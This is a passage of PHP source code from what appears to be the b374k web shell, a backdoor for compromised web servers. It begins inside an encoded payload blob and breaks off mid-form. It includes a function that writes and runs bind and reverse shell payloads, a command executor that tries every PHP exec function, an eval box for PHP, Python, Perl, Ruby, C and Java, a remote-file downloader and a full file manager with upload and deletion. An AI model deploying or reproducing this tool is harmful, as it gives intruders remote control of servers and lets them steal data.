PV2tVsAP51uFkv9s9VgTEiFSVKWg7nsP5GRxWrBJZ2m+7en6dhnIep/D2XNRakeXXGdSCWO9dVCY25OsF1YM++HxT9J7g/4tBhE/5cXj9FH0CiMPg1fR3QKujqOpZwOIhxjtVB0CyERzSmpdjVGV4LeOjDmMq+5A9yPw1LHJJrQVq57U8rkZjvhpXyxHu3yeIjMbmZzSuizXH8UrfrWN6022DXsvl0WfrheCu8LIbO4Lj2oFivk7UuLyv8LrYKN+61Kl8OLWatEun9ne/GLRVU3u+P6LDCVQKQb9P2kVeideo0ezQ1kt3HkLOzSPwLsm4crl+usqdTz9DleT3Z2bjcMUgSn90OcdyFuSGhAZBUzo4QToIUBrkhhXXnPeDYOslO5aVswjaulqMBXtjV8Px/sLJgXXnZ/3ReLT1oh1tuoLUEPtPKX00VeHLGV2a1uWMhmWlSCFLXNafQZbMGTq9JcHhsB4O9TCkDqEascfeshdSrTL4S1ReWpWWU7SBwSiwBs0Jtgwry+9jJaxMXP5VrHyvSij1v4OXfIeXRqbgYS5feqQXsQWNaL0gYrfenEEKNpG015uT4SQAJ5vPPPjTg0CMSQwrB2bMjNpJFiEcpE39Pr7uFxEJIO2904/BHHKc+Y+C9vuA+WON2T+I2R+VkyUmPIaQFtEqod5N3BrfNPdzuje//mIj3YeMh9JWa+aQdKIH1g5+l8E/YzWIIcoUyk35fRxxleX+upD5TxHIEoIE3bFCquoba+PjxSDR2E8iW67wCRsYoMosoCJ8/E1BztL6kgk+vvVGQ/zi9wCpOlR3WYpIjXRE6jQzZSNaquus8MU2TzTkxPhJmLkmkc4eYMtvrNKnJz0WtrrEFjq/a3VPT0Yt8SWSBjXfKtetNyZssK8wVKhs9a88W3GgBNSznNivOho+mEJohng786Q+a9mJ044gem7BxBQmTBuMZozd4nvKbuvQta229RV4tJU9Tumwym7r+bycFzyFRPV6HeAX88X2J10igO63XCyAjVafNV3BE/VdlxDe5KR0Biox3uov6q6A24fb8fArM5zMO4sA3GQqw73+OTiSwEkjxalSQlPwlEigqNs9oJf+pvI4jY4qau0R8oJilcRQWjY/rUsvIpsKGnp6P9v6GiXmdYDrb6+TYL8Gt1Io9AgOOygUEg02lwwQwcqmKY9wYWnFQYFNNe0G3n0Wh50qkm6dQu+xkS1fCWb2PXbS9TKQeTOTrp5KwfTuyVbUBHgVOrwT/wU=";

// make link for folder $cwd and all of its parent folder
function swd($p){
	$ps = explode(DIRECTORY_SEPARATOR,$p);
	$pu = "";
	for($i = 0 ; $i < sizeof($ps)-1 ; $i++){
		$pz = "";
		for($j = 0 ; $j <= $i ; $j++) $pz .= $ps[$j].DIRECTORY_SEPARATOR;
		$pu .= "<a href=\"?d=".$pz."\">".$ps[$i]." ".DIRECTORY_SEPARATOR." </a>";
	}
	return trim($pu);
}
// remove <br />tags
function rp($t){
	return trim(str_replace("<br />","",$t));
}
// replace spaces with underscore ( _ )
function cs($t){
	return str_replace(" ","_",$t);
}
// strip slashes,trim and urldecode
function ss($t){
	return (!get_magic_quotes_gpc())? trim(urldecode($t)) : trim(urldecode(stripslashes($t)));
}
// only strip slashes
function ssc($t){
	return (!get_magic_quotes_gpc())? $t : stripslashes($t);
}
// bind and reverse shell
function rs($rstype,$rstarget,$rscode){
	//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
	//resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php
	$result = "";
	$fc = gzinflate(base64_decode($rscode));

	$errperm = "Directory ".getcwd().DIRECTORY_SEPARATOR." is not writable, please change to a writable one";
	$errgcc = "Unable to compile using gcc";

	$split = explode("_",$rstype);
	$method = $split[0];
	$lang = $split[1];
	if($lang=="py" || $lang=="pl" || $lang=="rb"){
		if($lang=="py") $runlang = "python";
		elseif($lang=="pl") $runlang = "perl";
		elseif($lang=="rb") $runlang = "ruby";
		$fpath = "b374k_rs.".$lang;
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$result = exe("chmod +x ".$fpath);
				$result = exe($runlang." ".$fpath." ".$rstarget);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="c"){
		$fpath = "b374k_rs";
		if(is_file($fpath)) unlink($fpath);
		if(is_file($fpath.".c")) unlink($fpath.".c");
		if($file=fopen($fpath.".c","w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath.".c")){
				$result = exe("gcc ".$fpath.".c -o ".$fpath);
				if(is_file($fpath)){
					$result = exe("chmod +x ".$fpath);
					$result = exe("./".$fpath." ".$rstarget);
				}
				else $result = $errgcc;
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="win"){
		$fpath = "b374k_rs.exe";
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$result = exe($fpath." ".$rstarget);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="php"){
		eval("?>".$fc);
	}
	if(is_file($fpath)) unlink($fpath);
	if(is_file($fpath.".c")) unlink($fpath.".c");
	return $result;
}
// get file size
function gs($f){
	$s = filesize($f);
	if($s !== false){
		if($s<=0) return 0;
		$w = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
		$e = floor(log($s)/log(1024));
		return sprintf('%.2f '.$w[$e], ($s/pow(1024, floor($e))));
	}
	else return "???";
}
// get file permissions
function gp($f){
	if($m=fileperms($f)){
		$p='';
		$p .= ($m & 00400) ? 'r' : '-';
		$p .= ($m & 00200) ? 'w' : '-';
		$p .= ($m & 00100) ? 'x' : '-';
		$p .= ($m & 00040) ? 'r' : '-';
		$p .= ($m & 00020) ? 'w' : '-';
		$p .= ($m & 00010) ? 'x' : '-';
		$p .= ($m & 00004) ? 'r' : '-';
		$p .= ($m & 00002) ? 'w' : '-';
		$p .= ($m & 00001) ? 'x' : '-';
		return $p;
	}
	else return "??????????";
}
// shell command
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		system($c);
		$out = ob_get_contents();
		ob_end_clean();
		if(!empty($out)) return $out;
	}
	if(is_callable('shell_exec')){
		$out = shell_exec($c);
		if(!empty($out)) return $out;
	}
	if(is_callable('exec')) {
		exec($c,$r);
		foreach($r as $s){
			$out .= $s;
		}
		if(!empty($out)) return $out;
	}
	if(is_callable('passthru')) {
		ob_start();
		passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
		if(!empty($out)) return $out;
	}
	if(is_callable('proc_open')) {
		$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$proc = proc_open($c, $descriptorspec, $pipes, getcwd(), array());
		if (is_resource($proc)) {
			while ($si = fgets($pipes[1])) {
				if(!empty($si)) $out .= $si;
			}
			while ($se = fgets($pipes[2])) {
				if(!empty($se)) $out .= $se;
			}
		}
		proc_close($proc);
		if(!empty($out)) return $out;
	}
	if(is_callable('popen')){ 
		$f = popen($c, 'r');
		if($f){
			while(!feof($f)){
				$out .= fread($f, 2096);
			}
			pclose($f);
		}
		if(!empty($out)) return $out;
	}
	return "";
}
// add slash to the end of given path
function cp($p){
	if(is_dir($p)){
		$x = DIRECTORY_SEPARATOR;
		while(substr($p,-1) == $x) $p = rtrim($p,$x);
		return $p.$x;
	}
	return $p;
}
// delete dir and all of its content (no warning !) xp
function rmdirs($d) {
	$f = glob($d . '*', GLOB_MARK);
	foreach($f as $z){
		if(is_dir($z)) rmdirs($z);
		else unlink($z);
	}
	if(is_dir($d)) rmdir($d);
}
function xwhich($pr){
	$p = exe("which $pr");
	if(trim($p)!="") { return trim($p); } else { return trim($pr); }
}
// download file from internet
function dlfile($u,$p){
	$n = basename($u);

	// try using php functions
	if($t = file_get_contents($u)){
		if(is_file($p)) unlink($p);;
		if($f=fopen($p,"w")){
			fwrite($f,$t);
			fclose($f);
			if(is_file($p)) return true;
		}
	}
	// using wget
	exe(xwhich('wget')." ".$u." -O ".$p);
	if(is_file($p)) return true;

	// try using lwp-download
	exe(xwhich('lwp-download')." ".$u." ".$p);
	if(is_file($p)) return true;

	// try using lynx
	exe(xwhich('lynx')." -source ".$u." > ".$p);
	if(is_file($p)) return true;

	// try using curl
	exe(xwhich('curl')." ".$u." -o ".$p);
	if(is_file($p)) return true;

	return false;
}
// find writable dir
function get_writabledir(){
	if(is_writable(".")) $d = ".".DIRECTORY_SEPARATOR;
	else{
		if(!$d = getenv("TMP")) if(!$d = getenv("TEMP")) if(!$d = getenv("TMPDIR")){
			if(is_writable("/tmp")) $d = "/tmp/";
			else $d = getcwd().DIRECTORY_SEPARATOR;
		}
	}
	return $d;
}
// zip function
function zip($src, $dest){
	if(!extension_loaded('zip') || !file_exists($src)) return false;

	if(class_exists("ZipArchive")){
		$zip = new ZipArchive();
		if(!$zip->open($dest, 1)) return false;

		$src = str_replace('\\', '/', $src);
		if(is_dir($src)){
			$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src), 1);
			foreach($files as $file){
				$file = str_replace('\\', '/', $file);
				if(in_array(substr($file, strrpos($file, '/')+1), array('.', '..'))) continue;
				if (is_dir($file) === true)	$zip->addEmptyDir(str_replace($src . '/', '', $file . '/'));
				else if (is_file($file) === true) $zip->addFromString(str_replace($src . '/', '', $file), file_get_contents($file));
			}
		}
		elseif(is_file($src) === true) $zip->addFromString(basename($src), file_get_contents($src));
		$zip->close();
		return true;
	}
}
// check shell permission to access program
function check_access($lang){
	switch($lang){
		case "python":
			$cek = strtolower(exe("python -h"));
			if(strpos($cek,"usage")!==false) return true;
			break;
		case "perl":
			$cek = strtolower(exe("perl -h"));
			if(strpos($cek,"usage")!==false) return true;
			break;
		case "ruby":
			$cek = strtolower(exe("ruby -h"));
			if(strpos($cek,"usage")!==false) return true;
			break;
		case "gcc":
			$cek = strtolower(exe("gcc --help"));
			if(strpos($cek,"usage")!==false) return true;
			break;
		case "tar":
			$cek = strtolower(exe("tar --help"));
			if(strpos($cek,"usage")!==false) return true;
			break;
		case "java":
			$cek = strtolower(exe("javac --help"));
			if(strpos($cek,"usage")!==false){
				$cek = strtolower(exe("java -h"));
				if(strpos($cek,"usage")!==false) return true;
			}
			break;
	}
	return false;
}
// find available archiver
function get_archiver_available(){
	$dlfile = "";
	$avail_arc = array("raw"=>"raw");

	if(class_exists("ZipArchive")){
		$avail_arc["ziparchive"] = "zip";
	}
	if(check_access("tar")){
		$avail_arc["tar"] = "tar";
		$avail_arc["targz"] = "tar.gz";
	}
	
	$option_arc = "";
	foreach($avail_arc as $t=>$u){
		$option_arc .= "<option value=\"".$t."\">".$u."</option>";
	}
	
	$dlfile .= "<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\">
				<select onchange=\"download(this);\" name=\"dltype\" class=\"inputzbut\" style=\"width:80px;height:20px;\">
				<option value=\"\" disabled selected>Download</option>
				".$option_arc."
				</select>
				<input type=\"hidden\" name=\"dlpath\" value=\"__dlpath__\" />
				<input type=\"hidden\" name=\"d\" value=\"__dlcwd__\" />
				</form>
				";
	return $dlfile;
}
// explorer, return a table of given dir
function showdir($cwd){
	$posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	$win = (strtolower(substr(php_uname(),0,3)) == "win")? true : false;

	$fname = array();
	$dname = array();

	if(function_exists("scandir") && $dh = @scandir($cwd)){
		foreach($dh as $file){
			if(is_dir($file)) $dname[] = $file;
			elseif(is_file($file)) $fname[] = $file;
		}
	}
	else{
		if($dh = @opendir($cwd)){
			while($file = readdir($dh)){
				if(is_dir($file)) $dname[] = $file;
				elseif(is_file($file))$fname[] = $file;
			}
			closedir($dh);
		}
	}

	sort($fname);
	sort($dname);

	$path = explode(DIRECTORY_SEPARATOR,$cwd);
	$tree = sizeof($path);
	$parent = "";
	$owner_html = (!$win && $posix) ? "<th style=\"width:120px;\">owner : group</th>" : "";
	$buff = "
	<table class=\"explore sortable\">
	<tr><th>name</th><th style=\"width:60px;\">size</th>".$owner_html."<th style=\"width:70px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:180px;\">action</th><th style=\"width:90px;\">download</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $cwd;
	
	$dlfile = get_archiver_available();
		
	foreach($dname as $folder){
		if(!$win && $posix){
			$name = posix_getpwuid(fileowner($folder));
			$group = posix_getgrgid(filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			$owner_html = "<td style=\"text-align:center;\">".$owner."</td>";
		}
		$dlfile_ = str_replace("<option value=\"raw\">raw</option>", "", $dlfile);
		$dlfile_ = str_replace("__dlpath__",$folder,$dlfile_);
		$dlfile_ = str_replace("__dlcwd__",$cwd,$dlfile_);
		if($folder == ".") {
			$buff .= "<tr><td class=\"explorelist\" onmouseup=\"xplgo('".addslashes($cwd)."');\"><a href=\"?d=".$cwd."\">[ $folder ]</a></td><td>LINK</td>".$owner_html."<td style=\"text-align:center;\">".gp($cwd)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($cwd))."</td><td><span id=\"titik1\"><a href=\"?upload&amp;d=$cwd\">upload</a> | <a href=\"?d=$cwd&amp;edit=".$cwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			<input class=\"inputz\" id=\"titik1_\" style=\"width:110px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form></td><td>".$dlfile_."</td></tr>
			";
		}
		elseif($folder == "..") {
			$buff .= "<tr><td class=\"explorelist\" onmouseup=\"xplgo('".addslashes($parent)."');\"><a href=\"?d=".$parent."\">[ $folder ]</a></td><td>LINK</td>".$owner_html."<td style=\"text-align:center;\">".gp($parent)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($parent))."</td><td><span id=\"titik2\"><a href=\"?upload&amp;d=$parent\">upload</a> | <a href=\"?d=$cwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			<input class=\"inputz\" id=\"titik2_\" style=\"width:110px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			</td><td>".$dlfile_."</td></tr>";
		}
		else {
			$buff .= "<tr><td class=\"explorelist\" onmouseup=\"xplgo('".addslashes($cwd.$folder.DIRECTORY_SEPARATOR)."');\"><a id=\"".cs($folder)."_link\" href=\"?d=".$cwd.$folder.DIRECTORY_SEPARATOR."\">[ $folder ]</a>
			<form onclick=\"cancelBubble(event);\" action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\" id=\"".cs($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			<input class=\"inputz\" style=\"width:200px;\" id=\"".cs($folder)."_link_\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".cs($folder)."_form','".cs($folder)."_link');\" />
			</form>
			<td>DIR</td>".$owner_html."<td style=\"text-align:center;\">".gp($cwd.$folder)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($folder))."</td><td><a href=\"?upload&amp;d=".$cwd.$folder."\">upload</a> | <a href=\"javascript:tukar('".cs($folder)."_link','".cs($folder)."_form');\">rename</a> | <a href=\"?d=".$cwd."&amp;rmdir=".$cwd.$folder."\">delete</a></td><td>".$dlfile_."</td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $cwd.$file;
		if(!$win && $posix){
			$name = posix_getpwuid(fileowner($full));
			$group = posix_getgrgid(filegroup($full));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			$owner_html = "<td style=\"text-align:center;\">".$owner."</td>";
		}
		$dlfile_ = str_replace("__dlpath__",$file,$dlfile);
		$dlfile_ = str_replace("__dlcwd__",$cwd,$dlfile_);
		$buff .= "<tr><td class=\"explorelist\" onmouseup=\"xplgo('".addslashes($cwd)."&view=".addslashes($full)."');\"><a id=\"".cs($file)."_link\" href=\"?d=$cwd&amp;view=$full\">$file</a>
		<form onclick=\"cancelBubble(event);\" action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\" id=\"".cs($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" id=\"".cs($file)."_link_\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".cs($file)."_link','".cs($file)."_form');\" />
		</form>
		</td><td title=\"".filesize($full)."\">".gs($full)."</td>".$owner_html."<td style=\"text-align:center;\">".gp($full)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",filemtime($full))."</td>
		<td><a href=\"?d=$cwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".cs($file)."_link','".cs($file)."_form');\">rename</a> | <a href=\"?d=$cwd&amp;delete=$full\">delete</a></td><td>".$dlfile_."</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

// favicon
if(isset($_REQUEST['favicon'])){
	$data = gzinflate(base64_decode($favicon));
	header("Content-type: image/png");
	header("Cache-control: public");
	echo $data;
	exit;
}
if(isset($_REQUEST['font'])){
	$data = gzinflate(base64_decode($font));
	header("Content-type: application/font-woff");
	header("Cache-control: public");
	echo $data;
	exit;
}

if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
	// change working directory
	if(isset($_REQUEST['d'])){
		$dd = ss($_REQUEST['d']);
		if(is_dir($dd)){
			chdir($dd);
			$cwd = cp($dd);
		}
	}
	else $cwd = cp(getcwd());
	// get path and all drives available
	$letters = '';
	if(!$s_win){
		if(!$s_user = rp(exe("whoami"))) $s_user = "";
		if(!$s_id = rp(exe("id"))) $s_id = "";
	}
	else {
		$s_user = get_current_user();
		$s_id = $s_user;
		// find drive letters
	 	$v = explode("\\",$cwd);
		$v = $v[0];
		foreach (range("A","Z") as $letter){
			$bool = (is_dir($letter.":\\") && is_readable($letter.":\\"));
			if ($bool){
				$letters .= "<a href=\"?d=".$letter.":\\\">[ ";
				if ($letter.":" != $v) {$letters .= $letter;}
				else {$letters .= "<span style=\"color:#fff;\">".$letter."</span>";}
				$letters .= " ]</a> ";
			}
		}
	}
	// prompt style..
	$s_prompt = $s_user." &gt;";

	// check for posix
	$s_posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	
	// server ip
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip ;-)
	$s_my_ip = $_SERVER['REMOTE_ADDR'];
	

	// sorttable.js
	if(isset($_REQUEST['sorttable'])){
		$data = gzinflate(base64_decode($sortable_js));
		header("Content-type: text/javascript");
		header("Cache-control: public");
		echo $data;
		exit;
	}
	if(!empty($_REQUEST['dltype']) && !empty($_REQUEST['dlpath'])){
		$dltype = urldecode(ss($_REQUEST['dltype']));
		$dlpath = urldecode(ss($_REQUEST['dlpath']));
		
		$dlname = basename($dlpath);
		if($dlpath==".") $dlname=basename($cwd);
		elseif($dlpath==".."){
			chdir("..");
			$dlname=basename(getcwd());
			chdir($cwd);
		}
		$tmpdir = get_writabledir();
		$dlarchive = $tmpdir.$dlname;
		$dlthis = "";
		if($dltype=="ziparchive"){
			$dlarchive .= ".zip";
			if(zip($dlpath,$dlarchive)){
				$dlthis = $dlarchive;
			}
		}
		elseif($dltype=="tar"){
			$dlarchive .= ".tar";
			$dlarchive = str_replace('\\', '/', $dlarchive);
			exe("tar cf ".$dlarchive." ".$dlpath);
			$dlthis = $dlarchive;
		}
		elseif($dltype=="targz"){
			$dlarchive .= ".tar.gz";
			$dlarchive = str_replace('\\', '/', $dlarchive);
			exe("tar czf ".$dlarchive." ".$dlpath);
			$dlthis = $dlarchive;		
		}
		elseif($dltype=="raw"){
			if(is_file($dlpath)) $dlthis = $dlpath;
		}
		

		if(is_file($dlthis)){
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			header("Content-length: ".filesize($dlthis));
			header("Content-disposition: attachment; filename=\"".basename($dlthis)."\";");
			$file = @fopen($dlthis,"rb");
			while(!feof($file)){
				print(@fread($file, 1024*8));
				ob_flush();
				flush();
			}
			fclose($file);
			
			if($dltype!="raw"){
				rename($dlthis,$dlthis."del");
				unlink($dlthis."del");
			}
			exit;
		}
	}
	// view image specified by ?img=<file>
	if(isset($_REQUEST['img'])){
		ob_clean();
		$d = ss($_REQUEST['d']);
		$f = ss($_REQUEST['img']);
		$inf = getimagesize($d.$f);
		$ext = explode($f,".");
		$ext = $ext[count($ext)-1];
	 	header("Content-type: ".$inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));
	 	readfile($d.$f);
	 	exit;
	}
	// rename file or folder
	if(isset($_REQUEST['rename']) && isset($_REQUEST['oldname']) && isset($_REQUEST['newname'])){
		$old = ss($_REQUEST['oldname']);
		$new = ss($_REQUEST['newname']);
		if(rename($cwd.$old,$cwd.$new)) $dirmsg = "File ".$old." renamed to ".$new;
		else $dirmsg = "Unable to rename file ".$old." to ".$new;
		$fnew = $cwd.$new;
	}
	// delete file
	if(!empty($_REQUEST['delete'])){
		$f = ss($_REQUEST['delete']);
		if(is_file($f)){
			if(unlink($f)) $dirmsg = "File removed : ".$f;
			else $dirmsg = "Unable to remove file ".$f;
		}
		else $dirmsg = "Unable to remove file ".$f;
	} // delete dir
	elseif(!empty($_REQUEST['rmdir'])){
		$f = ss(rtrim(ss($_REQUEST['rmdir'],DIRECTORY_SEPARATOR)));
		if(is_dir($f)){
			rmdirs($f);
			if(is_dir($f)) $dirmsg = "Unable to remove directory ".$f;
			else $dirmsg = "Directory removed : ".$f;
		}
		else $dirmsg = "Unable to remove directory ".$f;
	} // create dir
	elseif(!empty($_REQUEST['mkdir'])){
		$f = ss($cwd.ss($_REQUEST['mkdir']));
		if(!is_dir($f)){
			mkdir($f);
			if(is_dir($f)) $dirmsg = "Directory created ".$f;
			else $dirmsg = "Unable to create directory ".$f;
		}
		else $dirmsg = "Directory already exists ".$f;
	}
	// box result
	$s_result = "";
	// php eval() function
	if(isset($_REQUEST['eval'])){
		$code = "";
		$lang = "php";
		// access to compiler/interpreter
		
		$s_python = check_access("python");
		$s_perl = check_access("perl");
		$s_ruby = check_access("ruby");
		$s_gcc = check_access("gcc");
		$s_java = check_access("java");
		
		if(isset($_REQUEST['evalcode'])){
			$code = ss($_REQUEST['evalcode']);
			$tmpdir = get_writabledir();
			if(isset($_REQUEST['lang'])){
				$lang = $_REQUEST['lang'];
			}

			if(strtolower($lang)=='php'){
				ob_start();
				eval($code);
				$res = ob_get_contents();
				ob_end_clean();
				$code = $res;
			}
			elseif(strtolower($lang)=='python'||strtolower($lang)=='perl'||strtolower($lang)=='ruby'){
				$rand = md5(time().rand(0,100));
				$script = $tmpdir.$rand;
				file_put_contents($script, $code);
				if(is_file($script)){
					$res = exe($lang." ".$script);
					unlink($script);
				}
				$code = $res;
			}
			elseif(strtolower($lang)=='gcc'){
				$script = md5(time().rand(0,100));
				chdir($tmpdir);
				file_put_contents($script.".c", $code);
				if(is_file($script.".c")){
					$scriptout = $s_win ? $script.".exe" : $script;
					$res = exe("gcc ".$script.".c -o ".$scriptout);
					if(is_file($scriptout)){
						$res = $s_win ? exe($scriptout) : exe("chmod +x ".$scriptout." ; ./".$scriptout);
						rename($scriptout, $scriptout."del");
						unlink($scriptout."del");
					}
					unlink($script.".c");
				}
				$code = $res;
				chdir($cwd);
			}
			elseif(strtolower($lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$code, $r)){
					$classname = trim($r[1]);
					$script = $classname;
				}
				else{
					$rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
					$script = $rand;
					$code = "class ".$rand." { ".$code . " } ";
				}
				chdir($tmpdir);
				file_put_contents($script.".java", $code);
				if(is_file($script.".java")){
					$res = exe("javac ".$script.".java");
					if(is_file($script.".class")){
						$res .= exe("java ".$script);
						unlink($script.".class");
					}
					unlink($script.".java");
				}
				chdir($pwd);
				$code = $res;
			}
		}

		$lang_available = "";
		$lang_available .= "<option value=\"php\">php</option>";
		$selected = "";
		if($s_python){
			$checked = ($lang == "python") ? "selected" : "";
			$lang_available .= "<option value=\"python\" ".$checked.">python</option>";
		}
		if($s_perl){
			$checked = ($lang == "perl") ? "selected" : "";
			$lang_available .= "<option value=\"perl\" ".$checked.">perl</option>";
		}
		if($s_ruby){
			$checked = ($lang == "ruby") ? "selected" : "";
			$lang_available .= "<option value=\"ruby\" ".$checked.">ruby</option>";
		}
		if($s_gcc){
			$checked = ($lang == "gcc") ? "selected" : "";
			$lang_available .= "<option value=\"gcc\" ".$checked.">c</option>";
		}
		if($s_java){
			$checked = ($lang == "java") ? "selected" : "";
			$lang_available .= "<option value=\"java\" ".$checked.">java</option>";
		}

		$s_result .= "<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"post\">
					<textarea id=\"evalcode\" name=\"evalcode\" class=\"evalcode\">".htmlspecialchars($code)."</textarea>
					<table><tr><td><input type=\"submit\" name=\"evalcodesubmit\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
					</td><td><select name=\"lang\" class=\"inputzbut\" style=\"width:120px;height:30px;padding:4px;\">
					".$lang_available."
					</select></td></tr>
					</table>
					<input type=\"hidden\" name=\"eval\" value=\"\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					</form>
					";
	} // upload !
	elseif(isset($_REQUEST['upload'])){
		$s_result = " ";
		$msg = "";
		if(isset($_REQUEST['uploadhd'])){
			$fn = $_FILES['filepath']['name'];
			if(is_uploaded_file($_FILES['filepath']['tmp_name'])){
				$p = cp(ss($_REQUEST['savefolder']));
				if(!is_dir($p)) $p = cp(dirname($p));
				if(isset($_REQUEST['savefilename']) && (trim($_REQUEST['savefilename'])!="")) $fn = ss($_REQUEST['savefilename']);
				$tm = $_FILES['filepath']['tmp_name'];
				$pi = cp($p).$fn;
				$st = move_uploaded_file($tm,$pi);
				if($st)	$msg = "<p class=\"rs_result\">file uploaded to <a href=\"?d=".$cwd."&amp;view=".$pi."\">".$pi."</a></p>";
				else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
			}
			else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
		}
		elseif(isset($_REQUEST['uploadurl'])){
			// function dlfile($url,$fpath){
			$p = cp(ss($_REQUEST['savefolderurl']));
			if(!is_dir($p)) $p = cp(dirname($p));
			$fu = ss($_REQUEST['fileurl']);
			$fn = basename($fu);
			if(isset($_REQUEST['savefilenameurl']) && (trim($_REQUEST['savefilenameurl'])!="")) $fn = ss($_REQUEST['savefilenameurl']);
			$fp = cp($p).$fn;
			$st = dlfile($fu,$fp);
			if($st) $msg = "<p class=\"rs_result\">file uploaded to <a href=\"?d=".$cwd."&amp;view=".$fp."\">".$fp."</a></p>";
			else $msg = "<p class=\"rs_result\">failed to upload ".$fn."</p>";
		}

		$s_result .= $msg;
		$s_result .= "
			<form action=\"" . $_SERVER['PHP_SELF'] . "?upload\" method=\"post\" enctype=\"multipart/form-data\">
			<div class=\"mybox\"><h2>Upload from computer</h2>
			<table class=\"myboxtbl\">
			<tr><td style=\"width:100px;\">File</td><td><input type=\"file\" name=\"filepath\" class=\"inputzbut\" style=\"width:400px;margin:0;\" />
			</td></tr>
			<tr><td>Save to</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefolder\" value=\"".$cwd."\" /></td></tr>
			<tr><td>Filename (optional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefilename\" value=\"\" /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type=\"submit\" name=\"uploadhd\" class=\"inputzbut\" value=\"Upload !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
			</td></tr>
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			</table>
			</div>
			</form>
			<form action=\"" . $_SERVER['PHP_SELF'] . "?upload\" method=\"post\">
			<div class=\"mybox\"><h2>Upload from internet</h2>
			<table class=\"myboxtbl\">
